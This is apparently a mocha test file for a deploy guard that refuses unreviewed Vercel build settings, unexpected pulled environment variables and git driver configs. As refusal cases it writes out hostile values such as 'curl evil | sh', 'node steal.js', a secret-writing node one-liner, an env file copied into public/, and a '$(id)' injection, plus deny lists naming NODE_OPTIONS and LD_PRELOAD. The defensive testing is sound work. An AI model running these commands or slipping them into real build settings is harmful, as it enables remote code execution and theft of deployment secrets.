/**
 * The Vercel project's build settings are executable input (Codex r5 F1): `vercel pull` writes them into
 * app/.vercel/project.json and the pinned CLI's build runs `settings.installCommand` and hands buildCommand,
 * outputDirectory, framework and nodeVersion to the builder, in a folder holding the pulled env files. The release
 * accepts only the reviewed document in ops/release-target.json (`vercelSettings`), and that document only if it runs
 * nothing of its own. These specs pin both halves and the stage rule (the pull may replace stale settings; nothing
 * after it may start on unreviewed ones).
 *
 *   npx mocha --import=tsx tests/release-deploy-vercel-settings.spec.ts
 */
import assert from "node:assert/strict";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { execFileSync } from "node:child_process";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { dropPulledEnv, execPinnedCli, preflight, releaseTargetRefusals, VERCEL_SETTINGS_KEYS } from "../ops/release-deploy.ts";
import { gitIn, gitProgramDrivers } from "../ops/trust-config.ts";
import { commitTarget, fakePinnedCli } from "./fake-pinned-cli.ts";
import { REVIEWED_ENGINES, REVIEWED_ENV_NAMES, REVIEWED_SETTINGS } from "./reviewed-settings.ts";

const IDS = { vercelOrgId: "team_A", vercelProjectId: "prj_A" };

/** A checkout with a committed target and a link; returns the root. */
function checkout(target: object, settings: unknown): string {
  const root = mkdtempSync(join(tmpdir(), "release-settings-"));
  mkdirSync(join(root, "app", ".vercel"), { recursive: true });
  writeFileSync(join(root, "app", "package.json"), JSON.stringify({ name: "fixture-app", private: true, engines: REVIEWED_ENGINES }));
  commitTarget(root, target);
  const link: Record<string, unknown> = { orgId: IDS.vercelOrgId, projectId: IDS.vercelProjectId };
  if (settings !== undefined) link.settings = settings;
  writeFileSync(join(root, "app", ".vercel", "project.json"), JSON.stringify(link));
  return root;
}
const refusals = (root: string, stage?: "before-pull" | "pulled") => releaseTargetRefusals(root, join(root, "app"), undefined, stage);

describe("the reviewed Vercel settings (Codex r5 F1)", () => {
  it("the committed document is the one the release accepts, and it runs nothing of its own", () => {
    assert.deepEqual(Object.keys(REVIEWED_SETTINGS).sort(), [...VERCEL_SETTINGS_KEYS].sort());
    assert.deepEqual(REVIEWED_SETTINGS, {
      framework: "nextjs", devCommand: null, installCommand: "", buildCommand: null, outputDirectory: null, rootDirectory: null,
      directoryListing: false, nodeVersion: "22.x",
    });
    assert.deepEqual(refusals(checkout({ ...IDS, vercelSettings: REVIEWED_SETTINGS, vercelEnvNames: REVIEWED_ENV_NAMES }, REVIEWED_SETTINGS)), []);
  });

  it("a target without the document, or with one that runs or moves the build, is no reviewed target", () => {
    assert.match(refusals(checkout(IDS, REVIEWED_SETTINGS)).join(), /must name vercelSettings/);
    for (const [k, v] of [
      ["installCommand", "curl evil | sh"], ["installCommand", null], ["buildCommand", "node steal.js && next build"],
      ["devCommand", "x"], ["outputDirectory", "public"], ["rootDirectory", "app"], ["framework", "other"], ["directoryListing", true],
      ["nodeVersion", "22"], ["nodeVersion", "$(id).x"],
    ] as const) {
      const bad = { ...REVIEWED_SETTINGS, [k]: v };
      const r = refusals(checkout({ ...IDS, vercelSettings: bad }, bad));
      assert.match(r.join(), new RegExp(`vercelSettings\\.${k}`), `${k}=${JSON.stringify(v)} is refused in the committed document`);
      // and before the pull too: the document itself is checked at every stage
      assert.match(refusals(checkout({ ...IDS, vercelSettings: bad }, undefined), "before-pull").join(), new RegExp(`vercelSettings\\.${k}`));
    }
    const extra = { ...REVIEWED_SETTINGS, monorepoManager: "turbo" };
    assert.match(refusals(checkout({ ...IDS, vercelSettings: extra }, REVIEWED_SETTINGS)).join(), /vercelSettings\.monorepoManager is not a build setting/);
    const missing: Record<string, unknown> = { ...REVIEWED_SETTINGS };
    delete missing.installCommand;
    assert.match(refusals(checkout({ ...IDS, vercelSettings: missing }, REVIEWED_SETTINGS)).join(), /vercelSettings\.installCommand must be ""/);
  });

  it("after the pull, the link's settings must be exactly the reviewed document", () => {
    const target = { ...IDS, vercelSettings: REVIEWED_SETTINGS, vercelEnvNames: REVIEWED_ENV_NAMES };
    for (const [k, v] of [
      ["installCommand", "node -e \"require('fs').writeFileSync('x', process.env.SWAP_BINDING_SECRET)\""], ["installCommand", null],
      ["buildCommand", "pnpm run build && cp .vercel/.env.preview.local public/"], ["outputDirectory", "out"], ["devCommand", "next dev"],
      ["framework", null], ["nodeVersion", "20.x"], ["directoryListing", true], ["rootDirectory", "."],
    ] as const) {
      const r = refusals(checkout(target, { ...REVIEWED_SETTINGS, [k]: v }));
      assert.match(r.join(), new RegExp(`settings\\.${k} is ${JSON.stringify(v).replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}, not the reviewed`), `${k}=${JSON.stringify(v)}`);
    }
    // keys the pinned CLI's build reads but its pull never writes, and Web Analytics' id, are refused
    assert.match(refusals(checkout(target, { ...REVIEWED_SETTINGS, monorepoManager: "turbo" })).join(), /settings\.monorepoManager is not a reviewed build setting/);
    assert.match(refusals(checkout(target, { ...REVIEWED_SETTINGS, analyticsId: "abc" })).join(), /analyticsId: Web Analytics is on/);
    assert.match(refusals(checkout(target, { ...REVIEWED_SETTINGS, createdAt: "today" })).join(), /createdAt is "today", not a date/);
    // no settings at all: the build would fetch its own
    assert.match(refusals(checkout(target, undefined)).join(), /holds no build settings/);
    // what the pull writes for an unset override is null, or nothing: both are the reviewed null; createdAt is a date
    const unsetLeftOut: Record<string, unknown> = { ...REVIEWED_SETTINGS, createdAt: 1759300000000 };
    for (const k of ["devCommand", "buildCommand", "outputDirectory", "rootDirectory"]) delete unsetLeftOut[k];
    assert.deepEqual(refusals(checkout(target, unsetLeftOut)), []);
    // but a left-out install command is the CLI's own install, not the reviewed "skip": refused
    const noInstall: Record<string, unknown> = { ...REVIEWED_SETTINGS };
    delete noInstall.installCommand;
    assert.match(refusals(checkout(target, noInstall)).join(), /settings\.installCommand is undefined, not the reviewed ""/);
  });

  it("before the pull a stale link's settings are not judged (the pull replaces them); the build never starts on them", () => {
    const target = { ...IDS, vercelSettings: REVIEWED_SETTINGS, vercelEnvNames: REVIEWED_ENV_NAMES };
    const sentinel = "touch /tmp/should-never-run";
    const root = checkout(target, { ...REVIEWED_SETTINGS, installCommand: sentinel });
    assert.deepEqual(preflight(root, undefined, "before-pull").filter((f) => /settings/.test(f)), []);
    const started: string[][] = [];
    const spawn = (_c: string, a: string[]) => { started.push(a); return 0; };
    // the pull may run: it only writes the settings
    assert.equal(execPinnedCli(fakePinnedCli(), ["pull", "--yes", "--environment=preview"], root, spawn), 0);
    assert.equal(started.length, 1);
    // the build is refused before the CLI starts, in both modes, naming the setting
    for (const args of [["build", "--yes"], ["build", "--yes", "--prod"]]) {
      assert.throws(() => execPinnedCli(fakePinnedCli(), args, root, spawn), /REFUSED before the CLI started[\s\S]*settings\.installCommand is "touch \/tmp\/should-never-run", not the reviewed ""/);
    }
    assert.equal(started.length, 1, "the build runner never started");
    // and the scan's preflight refuses them as well
    assert.match(preflight(root).join(), /settings\.installCommand/);
  });

  it("the target lists the project variables the app reads, and never one that changes node, is inlined, or is Vercel's own", () => {
    const base = { ...IDS, vercelSettings: REVIEWED_SETTINGS };
    assert.deepEqual(REVIEWED_ENV_NAMES, ["DEVNET_RPC_URL", "MAINNET_RPC_URL", "SWAP_BINDING_SECRET"]);
    assert.match(refusals(checkout(base, REVIEWED_SETTINGS)).join(), /must name vercelEnvNames/);
    for (const bad of ["NODE_OPTIONS", "NEXT_PUBLIC_SOLANA_RPC", "NPM_CONFIG_REGISTRY", "VERCEL_FIRST_DEPLOYMENT", "TURBO_TOKEN", "lower_case", "A B", 7]) {
      assert.match(refusals(checkout({ ...base, vercelEnvNames: [...REVIEWED_ENV_NAMES, bad] }, REVIEWED_SETTINGS)).join(), /vercelEnvNames/, String(bad));
    }
  });
});

describe("the pulled project variables (adversary pass on ce04cd9)", () => {
  const target = { ...IDS, vercelSettings: REVIEWED_SETTINGS, vercelEnvNames: REVIEWED_ENV_NAMES };
  const SECRET = "value-that-must-never-be-printed-3f9a";
  const pulled = (root: string, body: string, name = ".env.preview.local") => {
    const f = join(root, "app", ".vercel", name);
    writeFileSync(f, body);
    return f;
  };

  it("reviewed and Vercel-written names pass, and the file is removed before the build", () => {
    const root = checkout(target, REVIEWED_SETTINGS);
    const f = pulled(root, `# Created by Vercel CLI\nNX_DAEMON="false"\nSWAP_BINDING_SECRET="${SECRET}"\nTURBO_CACHE="remote:rw"\n` +
      `VERCEL="1"\nVERCEL_ENV="preview"\nVERCEL_GIT_COMMIT_SHA=""\nVERCEL_OIDC_TOKEN="${SECRET}"\nVERCEL_TARGET_ENV="preview"\nVERCEL_URL=""\n`);
    // until it is removed, the build refuses to start on it
    assert.match(preflight(root).join(), /\.vercel\/\.env\.preview\.local: the build would load the project's variables/);
    assert.deepEqual(dropPulledEnv(root), []);
    assert.equal(existsSync(f), false, "the pulled variables are removed");
    assert.deepEqual(preflight(root).filter((r) => /variables/.test(r)), []);
    // no pulled file at all (the pull wrote none) is fine too
    assert.deepEqual(dropPulledEnv(root), []);
  });

  it("any other name stops the release, names only the name, and leaves the file for inspection", () => {
    for (const name of ["NODE_OPTIONS", "NEXT_PUBLIC_SOLANA_RPC", "npm_config_registry", "ENABLE_EXPERIMENTAL_COREPACK", "LD_PRELOAD"]) {
      const root = checkout(target, REVIEWED_SETTINGS);
      const f = pulled(root, `# Created by Vercel CLI\n${name}="${SECRET}"\nSWAP_BINDING_SECRET="${SECRET}"\n`, ".env.production.local");
      const r = dropPulledEnv(root).join("\n");
      assert.match(r, new RegExp(`\\.env\\.production\\.local holds project variables the release does not accept: ${name}`), name);
      assert.ok(!r.includes(SECRET), "a value never appears in a refusal");
      assert.equal(existsSync(f), true);
      assert.match(preflight(root).join(), /the build would load the project's variables/);
    }
  });

  it("a line that is not NAME=value is refused without echoing it", () => {
    const root = checkout(target, REVIEWED_SETTINGS);
    pulled(root, `# Created by Vercel CLI\nSWAP_BINDING_SECRET="${SECRET}"\n export NODE_OPTIONS=${SECRET}\n`);
    const r = dropPulledEnv(root).join("\n");
    assert.match(r, /line 3 is not NAME=value/);
    assert.ok(!r.includes(SECRET));
  });

  it("the pulled settings are checked again at this step", () => {
    const root = checkout(target, { ...REVIEWED_SETTINGS, buildCommand: "node x.js" });
    pulled(root, "# Created by Vercel CLI\nVERCEL=\"1\"\n");
    assert.match(dropPulledEnv(root).join(), /settings\.buildCommand is "node x\.js"/);
  });
});

describe("the app pins the reviewed Node.js version (adversary pass on ce04cd9)", () => {
  it("app/package.json engines.node must be the reviewed nodeVersion, before pull and after", () => {
    const target = { ...IDS, vercelSettings: REVIEWED_SETTINGS, vercelEnvNames: REVIEWED_ENV_NAMES };
    for (const engines of [{ node: ">=22" }, { node: "24.x" }, {}, undefined]) {
      const root = checkout(target, REVIEWED_SETTINGS);
      writeFileSync(join(root, "app", "package.json"), JSON.stringify({ name: "fixture-app", engines }));
      for (const stage of ["before-pull", "pulled"] as const) {
        assert.match(preflight(root, undefined, stage).join(), /app\/package\.json engines\.node is .*, not the reviewed "22\.x"/, JSON.stringify(engines));
      }
    }
    // the repository's own app pins it
    const app = JSON.parse(readFileSync(new URL("../app/package.json", import.meta.url), "utf8"));
    assert.equal(app.engines.node, REVIEWED_SETTINGS.nodeVersion);
  });
});

describe("git program drivers in the repository's config (adversary pass on ce04cd9)", () => {
  it("a filter, diff or merge driver is refused by every TypeScript git call and by the preflight", () => {
    for (const key of ["filter.adv.clean", "filter.adv.process", "filter.adv.smudge", "diff.adv.textconv", "diff.adv.command", "merge.adv.driver", "diff.external"]) {
      const root = checkout({ ...IDS, vercelSettings: REVIEWED_SETTINGS, vercelEnvNames: REVIEWED_ENV_NAMES }, REVIEWED_SETTINGS);
      assert.deepEqual(gitProgramDrivers(root), []);
      execFileSync("git", ["-C", root, "config", key, "/bin/false %f"]);
      assert.deepEqual(gitProgramDrivers(root), [key]);
      assert.throws(() => gitIn(root, ["status", "--porcelain"]), new RegExp(`names programs git would run \\(${key.replace(/\./g, "\\.")}\\)`));
      assert.match(preflight(root, undefined, "before-pull").join(), new RegExp(`git config names programs git would run \\(${key.replace(/\./g, "\\.")}\\)`));
    }
    // an included config file is read too
    const root = checkout({ ...IDS, vercelSettings: REVIEWED_SETTINGS, vercelEnvNames: REVIEWED_ENV_NAMES }, REVIEWED_SETTINGS);
    const inc = join(root, "..", `inc-${Date.now()}.cfg`);
    writeFileSync(inc, "[filter \"adv\"]\n\tclean = /bin/false\n");
    execFileSync("git", ["-C", root, "config", "include.path", inc]);
    assert.deepEqual(gitProgramDrivers(root), ["filter.adv.clean"]);
  });
});

